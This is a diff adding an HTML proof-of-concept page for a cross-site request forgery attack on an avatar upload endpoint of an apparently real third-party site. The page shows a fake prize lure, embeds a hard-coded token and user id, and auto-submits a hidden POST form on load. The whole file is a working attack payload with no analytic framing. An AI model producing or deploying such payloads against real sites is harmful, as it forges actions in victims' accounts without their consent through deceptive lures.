@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head><title>CSRF PoC - Avatar Upload (Filled)</title></head>
+<body>
+<h1>You've won a prize! Click below to claim.</h1>
+<form id="csrf" method="POST" action="https://pan-yz.chaoxing.com/upload" enctype="multipart/form-data">
+    <input type="hidden" name="uploadtype" value="face" />
+    <input type="hidden" name="_token" value="c4f84343764b72973726f34f67c1d0b2" />
+    <input type="hidden" name="puid" value="402644510" />
+    <input type="file" name="file" style="display:none" />
+</form>
+<script>
+document.getElementById('csrf').submit();
+</script>
+</body>
+</html>
